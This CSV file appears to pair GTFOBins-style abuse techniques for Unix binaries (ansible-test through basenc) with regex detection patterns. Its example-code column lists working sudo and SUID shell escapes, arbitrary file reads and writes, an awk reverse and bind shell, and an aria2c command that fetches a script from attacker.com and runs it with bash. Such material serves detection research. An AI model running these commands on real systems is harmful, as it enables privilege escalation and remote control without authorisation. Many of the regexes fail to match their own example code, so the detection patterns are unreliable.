Name,Function,ExampleCode,Regex,Notes
ansible-test,shell,ansible-test shell,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
ansible-test,sudo,sudo ansible-test shell,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
aoss,shell,aoss /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
aoss,sudo,sudo aoss /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
apache2ctl,file-read,"apache2ctl -c ""Include $LFILE"" -k stop","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apache2ctl,sudo,"sudo apache2ctl -c ""Include $LFILE"" -k stop","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt-get,shell,"apt-get changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt-get,sudo,"sudo apt-get changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt-get,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","For this to work the target package (e.g., `sl`) must not be installed."
apt-get,sudo,sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",When the shell exits the `update` command is actually executed.
apt,shell,"apt changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt,sudo,"sudo apt changelog apt
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
apt,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","For this to work the target package (e.g., `sl`) must not be installed."
apt,sudo,sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",When the shell exits the `update` command is actually executed.
ar,file-read,"ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,suid,"./ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,sudo,"sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-allow\-overwrite\s*\-\-gid\s*\-\-on\-download\-complete\s+.+),The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
aria2c,file-download,"aria2c -o ""$LFILE"" ""$URL""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.
aria2c,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,limited-suid,"echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,file-read,"arj a ""$TF"" ""$LFILE""
arj p ""$TF""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file appears amid some other textual information. The archive can also be downloaded then extracted offline.
arj,file-write,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arj,sudo,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arj,suid,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The archive can also be prepared offline then uploaded.
arp,file-read,"arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,suid,"./arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,sudo,"sudo arp -v -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,file-read,as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,suid,./as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,sudo,sudo as @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,file-read,"ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,suid,"./ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,sudo,"sudo ascii-xfr -ns ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,file-read,"ascii85 ""$LFILE"" | ascii85 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,sudo,"sudo ascii85 ""$LFILE"" | ascii85 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,shell,ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,suid,./ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,sudo,sudo ash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ash\s+.+),
aspell,file-read,"aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,suid,"./aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,sudo,"sudo aspell -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
at,shell,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash))),
at,command,"echo ""$COMMAND"" | at now","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The invocation will be blind, but it is possible to redirect the output to a file in a readable location."
at,sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash))),
atobm,file-read,"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,sudo,"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,suid,"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,shell,"awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,non-interactive-reverse-shell,"awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
awk,non-interactive-bind-shell,"awk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
awk,file-write,"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,file-read,"awk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,suid,"./awk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,sudo,"sudo awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,limited-suid,"./awk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aws,shell,"aws help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
aws,sudo,"sudo aws help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
base32,file-read,"base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,suid,"base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,sudo,"sudo base32 ""$LFILE"" | base32 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,file-read,"base58 ""$LFILE"" | base58 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,sudo,"sudo base58 ""$LFILE"" | base58 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,file-read,"base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,suid,"./base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,sudo,"sudo base64 ""$LFILE"" | base64 --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,file-read,basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,suid,basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
